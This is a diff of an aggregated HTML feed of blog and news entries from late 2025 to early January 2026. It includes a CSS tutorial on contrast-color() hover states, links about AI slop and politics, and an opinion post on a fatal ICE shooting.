+    <article data-published="2026-01-08T19:04:37Z" data-link="https://lithub.com/stop-anthropomorphizing-lines-of-code/">
+      <h1>Stop anthropomorphizing lines of code.</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Elon Musk promised that his social media company X would be “the everything app,” but these days “everything” seems to only include slop, fascist propaganda, and abuse. Increasingly, the social media site has been awash in vulgar and non-consensual sexual</p>
+
+      <address>
+        <a href="https://lithub.com/stop-anthropomorphizing-lines-of-code/">https://lithub.com/stop-anthropomorphizing-lines-of-code/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T19:02:02Z" data-link="https://lithub.com/france-and-mexico-celebrated-their-friendiversary-by-exchanging-ancient-books/">
+      <h1>France and Mexico celebrated their friendiversary by exchanging ancient books.</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>At a recent meeting, French president Emmanuel Macron and Mexican President Claudia Sheinbaum conducted a highly symbolic book swap. To commemorate years of diplomatic relation—and sure, with an eye to continued trade—France and Mexico exchanged two ancient manuscripts: the Codex</p>
+
+      <address>
+        <a href="https://lithub.com/france-and-mexico-celebrated-their-friendiversary-by-exchanging-ancient-books/">https://lithub.com/france-and-mexico-celebrated-their-friendiversary-by-exchanging-ancient-books/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T18:28:41Z" data-link="https://go.theregister.com/i/cfa/https://www.theregister.com/2026/01/08/linus_versus_llms_ai_slop_docs/">
+      <h1>Linus Torvalds: Stop making an issue out of AI slop in kernel docs – you're not changing anybody's mind</h1>
+
+(date: 2026-01-08)
+      <p>
+      <h4>'Because the AI slop people aren't going to document their patches as such'</h4>
+<p>Today, it is hard to escape LLM bots and the endless slop they emit, but the Linux kernel might be largely safe … for now.</p>
+
+      <address>
+        <a href="https://go.theregister.com/i/cfa/https://www.theregister.com/2026/01/08/linus_versus_llms_ai_slop_docs/">https://go.theregister.com/i/cfa/https://www.theregister.com/2026/01/08/linus_versus_llms_ai_slop_docs/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T18:17:52Z" data-link="https://techcrunch.com/2026/01/08/andurils-palmer-luckey-thinks-the-future-of-tech-is-in-the-past/">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Palmer Luckey thinks the future of tech is in the past.</p>
+
+      <address>
+        <a href="https://techcrunch.com/2026/01/08/andurils-palmer-luckey-thinks-the-future-of-tech-is-in-the-past/">https://techcrunch.com/2026/01/08/andurils-palmer-luckey-thinks-the-future-of-tech-is-in-the-past/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T18:12:39Z" data-link="https://aifoc.us/dead-framework-theory/">
+      <h1>dead framework theory | AI Focus</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>This is depressing.</p>
+<p><a href="https://adactio.com/links/22348">adactio.com/links/22348</a></p>
+
+      <address>
+        <a href="https://aifoc.us/dead-framework-theory/">https://aifoc.us/dead-framework-theory/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T17:51:47Z" data-link="https://www.texasobserver.org/pam-perillo-women-death-row-community/">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Pam Perillo’s Sisterhood of the Condemned.</p>
+
+      <address>
+        <a href="https://www.texasobserver.org/pam-perillo-women-death-row-community/">https://www.texasobserver.org/pam-perillo-women-death-row-community/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T17:50:28Z" data-link="https://guykawasaki.substack.com/p/why-anointment-decides-who-really">
+      <h1>Why Anointment Decides Who Really Rises</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>In this week’s episode of Remarkable People, Toby Stuart unpacks the invisible systems that shape success, from institutional anointment to the subtle ways AI is already reshaping fairness.</p>
+
+      <address>
+        <a href="https://guykawasaki.substack.com/p/why-anointment-decides-who-really">https://guykawasaki.substack.com/p/why-anointment-decides-who-really</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T17:30:29Z" data-link="https://www.thenation.com/article/politics/trump-venezuela-real-estate/">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Trump's Mogul-First Model of Diplomacy.</p>
+
+      <address>
+        <a href="https://www.thenation.com/article/politics/trump-venezuela-real-estate/">https://www.thenation.com/article/politics/trump-venezuela-real-estate/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T16:46:00Z" data-link="https://daverupert.com/2026/01/algorithmic-hover-states-with-contrast-color/">
+      <h1>Algorithmic hover states with contrast-color()</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Firefox 146 added support for <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Values/color_value/contrast-color"><code>contrast-color()</code></a> joining Safari 26 in the First Implementor’s Club. For those unfamiliar, <code>contrast-color(&lt;color&gt;)</code> is a new CSS function that will take a <code>&lt;color&gt;</code> as input and returns either <code>white</code> or <code>black</code> depending on which has the most contrast.</p>
+<p>The quintessential example is choosing a foreground text <code>color</code> with the best contrast.</p>
+<pre><code>button {
+	--button-bg: red;
+	background: var(--button-bg);
+	color: contrast-color(var(--button-bg));
+	/* @returns black (5.25:1 WCAG AA Pass)
+			not white (3.99:1 WCAG AA Fail) */
+}
+
+</code></pre>
+<p>If someone changes <code>--button-bg</code> to purple, the foreground color automatically resolves to the either white or black, whichever has more contrast. It avoids having to set an extra token for color and takes the guess work out of picking an accessible foreground color.</p>
+<p>I think this is going to be an incredible boon to design systems where I don’t control what <code>--button-bg</code> is, but I do care about providing accessible experiences. And I think that’s the goal of this feature; to have “smart defaults” that lead to more accessible websites, easier algorithmically-driven color systems, and better “theme a whole website from a single color picker” demos.</p>
+<h2>Sure contrast-color() can do foreground colors, but what about backgrounds?</h2>
+<p>We’re having conversations at work about algorithmically driven rest/hover/active states for Buttons. In the current <a href="https://web.dev/baseline/">Baseline</a> you can use <code>color-mix()</code> to lighten/darken colors on <code>:hover</code>…</p>
+<pre><code>button {
+	background-color: var(--button-bg);
+	color: contrast-color(var(--button-bg));
+
+	&amp;:hover, &amp;:focus {
+		background-color: color-mix(
+			in srgb,
+			var(--button-bg) 90%,
+			black 10%
+		)
+	}
+}
+
+</code></pre>
+<p>The code above will dim your button on <code>:hover</code> 10% by mixing in black. But what if our Buttons are already dark (black, navy, etc)? In that situation we want to lighten the background-color instead of dimming. We can glue on new classes like <code>button.lighten-on-hover</code> or <code>button.invert-hover</code> and that works… until we get to light and dark theme modes of our Button where you probably want to lighten/darken oppositely depending on the mode…</p>
+<p>Ugh. In that situation you’d have <code>@media (prefers-color-scheme: dark)</code>, <code>[data-theme=&quot;dark&quot;]</code> styles in your Button styles and people are mad now because the Button styles are too complex. There’s got to be a better way!</p>
+<p>Well, do I have good news for you…</p>
+<p>See the Pen <a href="https://codepen.io/davatron5000/pen/bNpzYzX">contrast-color() powered lighten/darken bg on hover</a> by Dave Rupert ( <a href="https://codepen.io/davatron5000">@davatron5000</a>)
+on <a href="https://codepen.io">CodePen</a>.</p>
+<p>Per my previous conversations, I wondered if we could use <code>contrast-color()</code> to programmatically lighten/darken an button based on its current <code>background-color</code>. If the Button is black, and the contrast-color is white, let’s mix in white (and vice versa):</p>
+<pre><code>:root {
+	color-scheme: light dark;
+	--button-bg: light-dark(navyblue, lightpurple);
+}
+
+button {
+	background-color: var(--button-bg);
+	color: color-contrast(var(--button-bg));
+
+	&amp;:hover, &amp;:focus {
+		background-color: color-mix(
+			in srgb,
+			var(--button-bg) 75%,
+			contrast-color(var(--button-bg)) 10%
+		)
+	}
+}
+
+</code></pre>
+<p>Huzzah! Now our Button’s hover states go in the desired direction and our foreground <code>color</code> is intrinsically styled based on its own <code>background-color</code>. Nice. From a design systems perspective I’m pretty excited about the possibility to remove a bunch of state-based tokens from our collection.</p>
+<h3>Now available in… everywhere?</h3>
+<p>This approach only works in Safari and Firefox. However, if I use <a href="https://lea.verou.me/blog/2024/contrast-color/">Lea Verou’s method of polyfilling <code>contrast-color()</code></a>, we can pop in a custom <code>@function --contrast-color()</code> that works in Chromium 139+. The final working solution looks like this:</p>
+<pre><code>/* @function supported in Chromium */
+@function --contrast-color(--bg-color) {
+  --l: clamp(0, (l / var(--l-threshold, 0.623) - 1) * -infinity, 1);
+  result: oklch(from var(--bg-color) var(--l) 0 h);
+}
+
+button {
+  /* contrast-color() supported in Safari &amp; Firefox */
+  --button-fg: contrast-color(var(--button-bg));
+
+  @supports not (color: contrast-color(red)) {
+    --button-fg: --contrast-color(var(--button-bg));
+  }
+
+  background: var(--button-bg);
+  color: var(--button-fg);
+
+  &amp;:hover,
+  &amp;:focus{
+    background-color: color-mix(
+      in srgb,
+      var(--button-bg) 75%,
+      var(--button-fg) 10%
+    );
+  }
+}
+
+</code></pre>
+<p>Depending on your browser matrix, this may work for you. It’s probably a <em>smidge</em> too new for us to roll out to customers, right now but for personal sites heck yeah.</p>
+<p>This is interesting tech and I’m excited to dig in more. And spoiler alert, this is the first post in a small little series I have already written up for you.</p>
+
+      <address>
+        <a href="https://daverupert.com/2026/01/algorithmic-hover-states-with-contrast-color/">https://daverupert.com/2026/01/algorithmic-hover-states-with-contrast-color/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T16:45:56Z" data-link="https://tinabrown.substack.com/p/my-video-chat-with-leopoldo-lopez">
+      <h1>My Video Chat with Leopoldo López, exiled Venezuelan opposition leader </h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Watch this riveting interview with exiled opposition leader Leopoldo López, and hear how after more than five years in brutal Maduro custody he escaped Venezuela in the trunk of a car and what he thinks will happen next in these dangerous months of transition!</p>
+
+      <address>
+        <a href="https://tinabrown.substack.com/p/my-video-chat-with-leopoldo-lopez">https://tinabrown.substack.com/p/my-video-chat-with-leopoldo-lopez</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T16:27:03Z" data-link="https://denodell.com/blog/the-main-thread-is-not-yours">
+      <h1>The Main Thread Is Not Yours — Den Odell</h1>
+
+(date: 2026-01-08)
+      <p>
+      <blockquote>
+<p>Every millisecond you spend executing JavaScript is a millisecond the browser can’t spend responding to a click, updating a scroll position, or acknowledging that the user did just try to type something. When your code runs long, you’re not causing “jank” in some abstract technical sense; you’re ignoring someone who’s trying to talk to you.</p>
+</blockquote>
+<p>This is a <em>great</em> way to think about client-side JavaScript!</p>
+<p>Also:</p>
+<blockquote>
+<p>Before your application code runs a single line, your framework has already spent some of the user’s main thread budget on initialization, hydration, and virtual DOM reconciliation.</p>
+</blockquote>
+<p><a href="https://adactio.com/links/22347">adactio.com/links/22347</a></p>
+
+      <address>
+        <a href="https://denodell.com/blog/the-main-thread-is-not-yours">https://denodell.com/blog/the-main-thread-is-not-yours</a>
+      </address>
+    </article>
+
     <article data-published="2026-01-08T16:00:00Z" data-link="https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-425/">
       <h1>A Newsletter of Humorous Writing #425</h1>
 
@@ -89,6 +974,24 @@
 
       <address>
         <a href="https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-425/">https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-425/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T15:52:52Z" data-link="http://scripting.com/2026/01/08/155252.html?title=wasTheIceMurderPrecalculated">
+      <h1>Was the ICE murder pre-calculated?</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>When there's breaking news these days I check Fox News in addition to CNN, MSNOW, BBC, PBS. The best are the last two. But last night night when everyone was fixated on the <a href="https://en.wikipedia.org/wiki/Killing_of_Renee_Good">story</a> of Renee Nicole Good, the woman who was killed in cold blood, on video, by a masked ICE thug, I wondered what Fox was saying. They were showing the actual video over and over like the other networks. Their words were what Trump was saying, but they didn't hide what actually happened, at least as long as it's news.</p>
+<p>Then I wondered how much this was pre-calculated. It clearly doesn't hurt ICE to signal that they're killing US citizens in the US with impunity. Next time will be soon, and it will be more than one dead, and maybe they'll be kids. What makes me think this was not planned by the higher-ups is that they killed a middle-aged white woman, mother of 3,, who writes poetry. Not a very likely cartel leader or narco-terrorist. There were dolls in the glove compartment of the car.</p>
+<p>Every indication is that she was just afraid and trying to get out of there as quickly as possible.</p>
+<p>We also remember that in the aftermath of Jan 6, private texts from the top people at Fox indicated they were scared and appalled like most other relatively sane Americans. What had happened then was unthinkable. Well, what happened yesterday was just as unthinkable. Shocking. Makes you wonder what's next. Get ready, we're going to see a lot of ugliness now, hard to comprehend, hard to accept. We still have a skeletal democracy, and ICE isn't fully staffed yet (they have new billions of dollars to spend).</p>
+<p>On Facebook, <a href="https://www.facebook.com/dan.conover.714/posts/pfbid035Dzpcd13T73crrWxC85U6GMf1UH2qH148cJuYvEfHMzCUjMDypyha9vbrrMSKEDJl?comment_id=1185132377083238&amp;notif_id=1767891365875871&amp;notif_t=feedback_reaction_generic&amp;ref=notif">Dan Conover said</a>: &quot;This is what the collapse of the rules-based order looks like.&quot;</p>
+<p>I responded: &quot;Or it's a test of it. The guy wasn't very well disguised, I think he will be identified if he hasn't already been identified. Will he be arrested and tried? If yes, then we just validated the rule-based order. If no, we're fucked.</p>
+<p>&quot;Or even better the state of Minnesota could go to court and sue ICE to get their officers to wear identifying information, and no masks. For just this reason. And then here's an arrest warrant for the guy who fired his gun 3 times at the head of a 37-year old mom who writes poetry and drives an SUV with teddy bears in the glove compartment. In other words I'm not sure this was intentional (on behalf of ICE), and I think they may have to turn this guy over, otherwise someone is getting impeached. The video is too compelling.&quot;</p>
+
+      <address>
+        <a href="http://scripting.com/2026/01/08/155252.html?title=wasTheIceMurderPrecalculated">http://scripting.com/2026/01/08/155252.html?title=wasTheIceMurderPrecalculated</a>
       </address>
     </article>
 
@@ -198,7 +1101,7 @@ So the list of address ranges is the result but the list of ASNs is the intent.<
 
 (date: 2026-01-08)
       <p>
-      <p>A model for the future Nice piece on Craigslist in Wired. One paragraph: “It’s not a perfect platform by any means, but it does show that you can make a lot of money through an online endeavor that just treats users like they have some autonomy and grants everybody a degree of privacy,” says Lingel. […]</p>
+      <p>The human kind Fourteen years ago, agency had lost its original meaning, and was mostly applied to forms of business (real estate, advertising) and government bureaus (farm service, emergency management). That's why I devoted a chapter of The Intention Economy to what agency meant in the first place. Wrote about it again last year in Real Agency. Now […]</p>
 
       <address>
         <a href="https://doc.searls.com/2026/01/08/thrustday/">https://doc.searls.com/2026/01/08/thrustday/</a>
@@ -604,6 +1507,18 @@ Since those requests will all hit the same host, however, I’m using a hard cod
       </address>
     </article>
 
+    <article data-published="2026-01-08T00:00:00Z" data-link="https://buttondown.com/blog/2026-01-08-seline-tinylytics-support">
+      <h1>Seline and Tinylytics support</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Two new privacy-friendly analytics integrations for your archives.</p>
+
+      <address>
+        <a href="https://buttondown.com/blog/2026-01-08-seline-tinylytics-support">https://buttondown.com/blog/2026-01-08-seline-tinylytics-support</a>
+      </address>
+    </article>
+
     <article data-published="2026-01-07T23:50:16Z" data-link="https://en.wikipedia.org/wiki/Killing_of_Renee_Good">
       <h1>@Dave Winer's linkblog</h1>
 
@@ -884,7 +1799,7 @@ Since those requests will all hit the same host, however, I’m using a hard cod
 
 (date: 2026-01-07)
       <p>
-      <p>About 25 years ago, friends and I ran a website called ‘Living Without Microsoft‘. It was a news, reviews and advice hub for anyone considering the revolutionary idea that you could actually use a computer – maybe even run a company, school or government department – without being dependent on Windows and Office; without incurring <a href="https://statusq.org/archives/2026/01/07/13491/">Continue Reading</a></p>
+      <p>About 25 years ago, friends and I ran a website called Living Without Microsoft. It was a news, reviews and advice hub for anyone considering the revolutionary idea that you could actually use a computer – maybe even run a company, school or government department – without being dependent on Windows and Office; without incurring <a href="https://statusq.org/archives/2026/01/07/13491/">Continue Reading</a></p>
 
       <address>
         <a href="https://statusq.org/archives/2026/01/07/13491/">https://statusq.org/archives/2026/01/07/13491/</a>
@@ -2459,7 +3374,7 @@ Some posts are a lot of work, and take more than a week. Major talks, such as <a
     <article data-published="2026-01-06T03:03:01Z" data-link="https://daringfireball.net/2026/01/pickle_smells_like_a_cult">
       <h1>★ Pickle Smells Like a Cult</h1>
 
-(date: 2026-01-06)
+(date: 2026-01-06, updated: 2026-01-08)
       <p>
       <p>The only way Pickle could sound *more* like a cult would be if their “employees” (are any of them actually getting paid?) all shaved their heads and wore Hare Krishna-style robes.</p>
 
@@ -3487,9 +4402,9 @@ Alternative name: Inline script
 (date: 2026-01-04)
       <p>
       <p>I’m releasing my WebGL CRT Shader as open source.</p>
-<p>It creates a CRT/vintage TV effect so could be used in games, emulators, apps, demos, visuals, etc.</p>
+<p>It creates a CRT/vintage TV effect so could be used in games, emulators, apps, demos, visuals, etc. It’s not a simulator just something that gives the same general old school vibe.</p>
 <p>As a WebGL shader, it runs on the device’s hardware GPU in the browser and renders to a <!-- raw HTML omitted --> (or offscreen canvas). I currently use it with Three.js, and the demo below uses just a 2D canvas.</p>
-<p>It’s optimised to run well on low power devices as far back as iPhone XS, though I’m certain it can be optimised even further. <a href="https://github.com/gingerbeardman/webgl-crt-shader/pulls">PRs welcome</a>! The easiest optimisation would be removing processing of unused parameters.</p>
+<p>It’s optimised to run well on low power devices as far back as iPhone XS, though I’m certain it can be optimised even further. <a href="https://github.com/gingerbeardman/webgl-crt-shader/pulls">PRs welcome</a>! The easiest personal optimisation you might make would be removing processing of unused parameters.</p>
 <p>Is it scientifically correct? <em>Hell no.</em> Does it look good? <em>Yes.</em> Does it give you the feels? <em>Absolutely.</em></p>
 <p><a href="https://github.com/gingerbeardman/webgl-crt-shader/">github.com/gingerbeardman/webgl-crt-shader/</a></p>
 <hr>
@@ -4056,18 +4971,6 @@ control of one of Deep Robotics’ Lite-series products in just an hour.</p>
       </address>
     </article>
 
-    <article data-published="2026-01-03T18:09:42Z" data-link="https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/">
-      <h1>@Dave Winer's linkblog</h1>
-
-(date: 2026-01-03)
-      <p>
-      <p>The Case for Blogging in the Ruins.</p>
-
-      <address>
-        <a href="https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/">https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/</a>
-      </address>
-    </article>
-
     <article data-published="2026-01-03T18:07:25Z" data-link="https://www.theatlantic.com/international/2026/01/trumps-critics-should-not-go-wobbly-over-venezuela/685487/?gift=f35zZN0v_gDFE8xNwlQAHQh6nk7RWoKztRCNqzAuOAM&utm_source=copy-link&utm_medium=social&utm_campaign=share">
       <h1>@Dave Winer's linkblog</h1>
 
@@ -4246,6 +5149,21 @@ actually browsing, but is really annoying during the writing and design process.
 
       <address>
         <a href="https://adactio.com/notes/22334">https://adactio.com/notes/22334</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-03T10:29:45Z" data-link="https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/">
+      <h1>The Case for Blogging in the Ruins</h1>
+
+(date: 2026-01-03)
+      <p>
+      <blockquote>
+<p>Start a blog. Start one because the practice of writing at length, for an audience you respect, about things that matter to you, is itself valuable. Start one because owning your own platform is a form of independence that becomes more important as centralized platforms become less trustworthy. Start one because the format shapes the thought, and this format is good for thinking.</p>
+</blockquote>
+<p><a href="https://adactio.com/links/22333">adactio.com/links/22333</a></p>
+
+      <address>
+        <a href="https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/">https://www.joanwestenberg.com/the-case-for-blogging-in-the-ruins/</a>
       </address>
     </article>
 
@@ -6107,7 +7025,7 @@ Happy New Year</p>
       <p>
       <p>2025, eh? <em>What a blast.</em></p>
 <p>This year saw an incredible burst of creativity and exploration. I started the year <a href="/2025/01/05/dream-ride-for-sega-dreamcast-and-emulators/">shipping a multi-player arcade racing game for Sega Dreamcast</a>, coded in bed <a href="/2025/02/20/making-games-on-iphone-ipad-using-lua-and-love2d/">making games on iOS using Love2D</a>, made a little game that <a href="/2025/05/09/atari-jeff-minter-game-results-jam-llamasoft-and-st-format/">won at a PC gamejam</a> thanks to <em>Atari</em> &amp; <em>Jeff Minter</em>, and created everything from <a href="/2025/08/21/wormhole-for-perplexity-comet/">browser games</a> to <a href="/tag/djmix/">number one DJ mixes</a>. One big milestone was <a href="/2025/03/28/macintosh-magazine-media-1-million-files/">my <em>Macintosh Magazine Media</em> project surpassed 1 million files</a> (that’s over 30 million uncompressed files). <em>Nerd alert!</em></p>
-<p>The year also brought significant challenges—navigating <a href="/2025/04/15/when-playdate-stopped-being-fun/">community harassment led me to step back from the Playdate scene</a> after nearly six years of creative work there. I decided to bang a drum about that and <a href="/2025/08/02/donating-my-playdate-earnings-to-the-cybersmile-foundation/">I now donate all of my Playdate earnings to charity</a>. This year also opened new doors: I landed my dream job and am now building a game studio and creating my dream game. Pretty cool.</p>
+<p>The year also brought significant challenges—navigating <a href="/2025/04/15/when-playdate-stopped-being-fun/">community harassment led me to step back from the Playdate scene</a> after nearly six years of creative work there. I decided to bang a drum about that and <a href="/2025/08/02/donating-my-playdate-earnings-to-the-cybersmile-foundation/">I now donate all of my Playdate earnings to charity</a>. This year also opened new doors: I landed my dream job to build a game studio and my dream game. Pretty cool.</p>
 <p>Through it all, I kept creating, kept learning, and kept sharing. Still trying to launch <a href="/2025/08/28/dottie-native-macos-pixel-art-editor-wip/">some apps</a> and games that have been finished for months or years, and that I use myself every day. Maybe in 2026.</p>
 <h2>How many posts?</h2>
 <ul>
@@ -13547,838 +14465,6 @@ anything amiss.</p>
 
       <address>
         <a href="https://us-rse.org/2025-12-19-dismantling-of-ncar/">https://us-rse.org/2025-12-19-dismantling-of-ncar/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T23:57:58Z" data-link="https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything">
-      <h1>swift-justhtml</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p><strong><a href="https://github.com/kylehowells/swift-justhtml">swift-justhtml</a></strong></p>
-<p>First there was Emil Stenström's <a href="https://simonwillison.net/2025/Dec/14/justhtml/">JustHTML in Python</a>, then my <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">justjshtml in JavaScript</a>, then Anil Madhavapeddy's <a href="https://simonwillison.net/2025/Dec/17/vibespiling/">html5rw in OCaml</a>, and now Kyle Howells has built a vibespiled dependency-free HTML5 parser for Swift using the same coding agent tricks against the <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> test suite.</p>
-<p>Kyle ran <a href="https://github.com/kylehowells/swift-justhtml/blob/master/Benchmarks/BENCHMARK_RESULTS.md#performance-comparison">some benchmarks</a> to compare the different implementations:</p>
-<blockquote>
-<ul>
-<li><strong>Rust (html5ever)</strong> total parse time: 303 ms</li>
-<li><strong>Swift</strong> total parse time: 1313 ms</li>
-<li><strong>JavaScript</strong> total parse time: 1035 ms</li>
-<li><strong>Python</strong> total parse time: 4189 ms</li>
-</ul>
-</blockquote>
-<p>Tags: <a href="https://simonwillison.net/tags/html5">html5</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/ai-assisted-programming">ai-assisted-programming</a>, <a href="https://simonwillison.net/tags/vibe-coding">vibe-coding</a>, <a href="https://simonwillison.net/tags/swift">swift</a></p>
-
-      <address>
-        <a href="https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything">https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T23:27:14Z" data-link="https://steady.substack.com/p/a-few-good-memories">
-      <h1>A Few Good Memories</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Rob Reiner told me he knew Trump was trouble</p>
-
-      <address>
-        <a href="https://steady.substack.com/p/a-few-good-memories">https://steady.substack.com/p/a-few-good-memories</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T22:20:38Z" data-link="https://go.theregister.com/i/cfa/https://www.theregister.com/2025/12/18/firefox_no_ai_alternative_waterfox/">
-      <h1>Waterfox browser goes AI-free, targets the Firefox faithful</h1>
-
-(date: 2025-12-18)
-      <p>
-      <h4>Even if Mozilla is going to add an AI kill switch, that may not be enough to reassure many.</h4>
-<p>Waterfox, a popular fork of Firefox, is saying nay to AI. Considering how unpopular Mozilla's plan to botify its browser has become, this could win the alternative some converts.</p>
-
-      <address>
-        <a href="https://go.theregister.com/i/cfa/https://www.theregister.com/2025/12/18/firefox_no_ai_alternative_waterfox/">https://go.theregister.com/i/cfa/https://www.theregister.com/2025/12/18/firefox_no_ai_alternative_waterfox/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T20:50:33Z" data-link="https://mjtsai.com/blog/2025/12/18/japan-app-marketplaces-external-payments-new-fee-structure/">
-      <h1>Japan: App Marketplaces, External Payments, New Fee Structure</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Apple: Apple today announced changes impacting iOS apps in Japan to comply with the Mobile Software Competition Act (MSCA). These updates create new options for developers to distribute apps on alternative app marketplaces and to process app payments for digital goods and services outside of Apple In-App Purchase. […] The MSCA’s requirements for alternative app […]</p>
-
-      <address>
-        <a href="https://mjtsai.com/blog/2025/12/18/japan-app-marketplaces-external-payments-new-fee-structure/">https://mjtsai.com/blog/2025/12/18/japan-app-marketplaces-external-payments-new-fee-structure/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T20:49:19Z" data-link="https://mjtsai.com/blog/2025/12/18/batch-delete-in-swiftdata/">
-      <h1>Batch Delete in SwiftData</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Fatbobman: SwiftData provides a batch deletion API that is more modern and type-safe than its Core Data counterpart. […] Note: Unlike the standard single-object deletion modelContext.delete(_ model: T), batch deletion is only applied to the database after save() is executed. Coming from Core Data, this is really strange. With Core Data, NSBatchUpdateRequest and the other […]</p>
-
-      <address>
-        <a href="https://mjtsai.com/blog/2025/12/18/batch-delete-in-swiftdata/">https://mjtsai.com/blog/2025/12/18/batch-delete-in-swiftdata/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T20:47:46Z" data-link="https://mjtsai.com/blog/2025/12/18/extended-attributes-flags-in-tahoe/">
-      <h1>Extended Attributes Flags in Tahoe</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Howard Oakley: When first introduced in Mac OS X, no provision was made for xattrs to have type-specific preservation, and that was added later using flags suffixed to the xattr’s name. For example, the com.apple.lastuseddate xattr found commonly on edited files is shown with a full name of com.apple.lastuseddate#PS to assign the two flags P […]</p>
-
-      <address>
-        <a href="https://mjtsai.com/blog/2025/12/18/extended-attributes-flags-in-tahoe/">https://mjtsai.com/blog/2025/12/18/extended-attributes-flags-in-tahoe/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T19:32:07Z" data-link="https://mastodon.social/@Migueldeicaza/115742233537247438">
-      <h1>@Miguel de Icaza Mastondon feed</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>OMG, I didn’t think they would attempt a second pass at corporate suicide, but they are!</p>
-<p>Grab the popcorn folks!</p>
-<p><a href="https://mastodon.gamedev.place/@slembcke/115742185079110692">https://mastodon.gamedev.place/@slembcke/115742185079110692</a></p>
-
-      <address>
-        <a href="https://mastodon.social/@Migueldeicaza/115742233537247438">https://mastodon.social/@Migueldeicaza/115742233537247438</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T19:12:13Z" data-link="https://lithub.com/two-stories-about-three-brothers-you-should-check-out-this-holiday-season/">
-      <h1>Two stories about three brothers you should check out this holiday season.</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>I’m a devotee of two film series at my local Brooklyn indie theater: Ridiculous &lt;&gt; Sublime, a series highlighting “the most bombastic and confounding movies imaginable,” and Hubba Hubba, a series by my friend Mark Pagán that takes “a long</p>
-
-      <address>
-        <a href="https://lithub.com/two-stories-about-three-brothers-you-should-check-out-this-holiday-season/">https://lithub.com/two-stories-about-three-brothers-you-should-check-out-this-holiday-season/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T19:11:05Z" data-link="https://adactio.com/notes/22312">
-      <h1>Thursday session</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p><img src="https://adactio.com/images/uploaded/22312/small.jpg" alt="Thursday session"></p>
-<p>Thursday session</p>
-
-      <address>
-        <a href="https://adactio.com/notes/22312">https://adactio.com/notes/22312</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T19:00:00Z" data-link="https://blog.jim-nielsen.com/2025/you-might-also-like-my-notes-blog/">
-      <h1>You Might Also Like: My Notes Blog</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>If you subscribe to this blog, you must like it — right? I mean, you are subscribed to it.</p>
-<p>And if you like this blog, you might also like <a href="https://notes.jim-nielsen.com">my notes blog</a>.</p>
-<p>It’s where I take short notes of what I read, watch, listen to, or otherwise consume, add my two cents, and fire it off into the void of the internet.</p>
-<p>It’s sort of like a “link blog” but I’m not necessarily recommending everything I link to. It’s more of “This excerpt stood out to me in some way, here’s my thoughts on why.”</p>
-<p>It’s nice to have a place where I can jot down a few notes, fire off my reaction, and nobody can respond to it lol. At least, not in any easy, friction-less way. You’d have to go out of your way to read my commentary, find my contact info, and fire off a message (critiquing or praising). That’s how I like it. Cuts through the noise.</p>
-<p>Anyway, this is all a long way of saying: if you didn’t already know about my notes blog, you might like it. <a href="https://notes.jim-nielsen.com">Check it out</a> or <a href="https://notes.jim-nielsen.com/feed.xml">subscribe</a>.</p>
-<p>Today, for example, I posted lots of grumpy commentary.</p>
-<ul>
-<li><a href="https://notes.jim-nielsen.com/#2025-12-18T1130">https://notes.jim-nielsen.com/#2025-12-18T1130</a></li>
